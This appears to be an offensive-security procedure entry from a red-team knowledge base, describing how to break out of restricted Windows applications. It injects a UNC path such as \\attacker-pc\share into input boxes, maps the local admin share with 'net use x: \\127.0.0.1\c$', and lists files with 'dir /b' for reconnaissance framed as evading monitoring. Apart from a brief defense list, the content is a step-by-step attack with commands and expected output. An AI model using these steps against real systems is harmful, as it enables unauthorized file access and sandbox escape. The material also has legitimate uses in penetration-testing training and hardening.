---
type: procedure
description: >-
  Exploit input boxes and context menus in applications to perform UNC path
  injection, enabling access to local or remote files and potential command
  execution for breakout from application sandbox.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Windows Command Shell]]'
sub_techniques: []
tags:
  - application-escape
  - unc-path-injection
  - input-box-exploitation
  - context-menu-exploration
commands:
  - '[[commands/net-use-map-drive-to-local-c]]'
  - '[[commands/cmd-dir-list-bare]]'
platforms:
  - Windows
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# UNC-Path-Injection-via-Input-Boxes-for-Application-Escape

## Summary

This procedure demonstrates how to escape application boundaries by injecting UNC paths into input boxes and context menus, allowing unauthorized access to local drives, remote shares, and file listings. It targets vulnerabilities in file path handling within sandboxed or restricted applications, potentially leading to remote code execution or data exfiltration on Windows systems.

## Description

Application escape and breakout techniques exploit weaknesses in how applications process user inputs, such as file paths in input boxes or context menus, to access resources outside the intended scope. UNC (Universal Naming Convention) path injection involves crafting paths like \\server\share to trick the application into resolving network or local resources, bypassing sandbox restrictions. This can map drives to sensitive locations like the C: drive or list directory contents, enabling further privilege escalation or data theft. The technique is particularly effective against legacy applications or those with poor input validation. From a defender's perspective, it highlights the need for strict path sanitization and monitoring for anomalous file access patterns.

## Requirements

1. Access to a vulnerable application with input boxes or context menus that accept file paths (e.g., file open dialogs or search fields).
2. Attacker machine on the same network or localhost for UNC resolution.
3. Windows environment on the target for UNC path support.
4. Basic knowledge of Windows networking and command-line tools.

## Defense

- Regularly update and patch applications to address known path traversal vulnerabilities.
- Implement input validation and sanitization to reject UNC paths or absolute file references.
- Enforce principle of least privilege, sandboxing applications to prevent access to local drives.
- Monitor system logs for suspicious net use commands, UNC resolutions, or unauthorized file access via tools like Windows Event Logging or Sysmon.

## Objectives

1. Identify exploitable input fields in the application for UNC path injection.
2. Gain unauthorized access to local or remote file systems.
3. Execute commands to list or manipulate files, achieving application breakout.

## Instructions

### Step 1: Identify and Inject UNC Path into Input Box

**Context**: Locate an input box or context menu in the application that processes file paths (e.g., 'Open File' or search functionality). Craft a UNC path pointing to an attacker-controlled share to test if the application resolves and accesses it, potentially executing or reading from the remote location.

Inject the following UNC path example into the input field:

\\attacker-pc\share

> This injection attempts to force the application to connect to the attacker's machine. If successful, it may trigger a file access or execution, confirming the vulnerability. Monitor the attacker machine for incoming connections.

**Expected Output**: Application attempts to access the UNC path, potentially showing an error if the share doesn't exist or succeeding with file dialog/response indicating resolution.

### Step 2: Map Local Drive Using UNC to Localhost

**Context**: Once escaped or if the application allows command execution post-injection, use the net use command to map a drive letter to the local C: drive via UNC notation (\\127.0.0.1\c$). This bypasses direct local access restrictions by treating the local system as a network resource.

**Command** ([[commands/net-use-map-drive-to-local-c]]):
```cmd
net use x: \\127.0.0.1\c$
```

> This command maps the hidden admin share of the C: drive to drive X:. It requires appropriate privileges but can succeed in misconfigured environments. Verify the mapping by checking available drives.

**Expected Output**: Success message like "The command completed successfully." Drive X: now accessible via Explorer or command line.

### Step 3: List Files in Mapped Directory

**Context**: With the drive mapped, navigate to the root (e.g., C:\) and use dir to enumerate files and directories. The /b flag provides a bare list without extra details, useful for quick reconnaissance without alerting monitoring tools.

**Command** ([[commands/cmd-dir-list-bare]]):
```cmd
X:\> dir /b
```

> Run this from the mapped drive to list contents. It reveals file names, aiding in identifying sensitive data or further exploitation paths.

**Expected Output**: A plain list of files and folders, e.g.:

Program Files
Users
Windows
boot.ini

**Success Indicators**:
- UNC injection resolves without rejection.
- Drive mapping completes successfully.
- Directory listing shows expected system files.
